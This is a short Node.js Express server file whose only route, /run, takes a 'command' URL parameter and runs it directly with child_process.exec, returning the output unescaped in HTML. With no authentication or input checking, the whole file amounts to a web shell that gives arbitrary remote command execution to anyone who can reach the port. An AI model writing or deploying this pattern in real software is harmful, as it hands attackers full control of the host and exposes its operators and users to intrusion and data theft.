const express = require('express');
const { exec } = require('child_process');

const app = express();
const PORT = process.env.PORT || 3000;

// Route to execute commands from URL parameter
app.get('/run', (req, res) => {
    // Get the command from the URL parameter
    const command = req.query.command;

    if (!command) {
        res.status(400).send('Missing command parameter');
        return;
    }

    // Execute the command
    exec(command, (error, stdout, stderr) => {
        if (error) {
            res.send(`<pre>Error: ${error.message}</pre>`);
            return;
        }
        if (stderr) {
            res.send(`<pre>stderr: ${stderr}</pre>`);
            return;
        }
        res.send(`<pre>${stdout}</pre>`);
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
